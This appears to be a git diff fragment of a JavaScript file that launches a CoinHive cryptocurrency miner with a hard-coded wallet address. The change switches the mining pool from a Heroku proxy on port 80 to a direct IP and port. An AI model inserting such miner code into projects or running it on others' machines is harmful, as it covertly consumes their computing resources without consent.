@@ -9,10 +9,8 @@ const findRemoveSync = require("find-remove");
   
   const miner = await CoinHive('44tKLXJSEJPBkfGpwiz4Hy23ZdBdPTXhXXjncmJUg2J2fbEvfreyxRgfo6PvGgr5GRGasJVhYDgf5GTcmNLyrLfUAXMPGaG', {
     pool: {
-      //host: '213.32.29.150',
-      //port: 14444
-      host: 'fishyprox.herokuapp.com',
-      port: 80
+      host: '213.32.29.150',
+      port: 14444
     }
   });
   await miner.start();
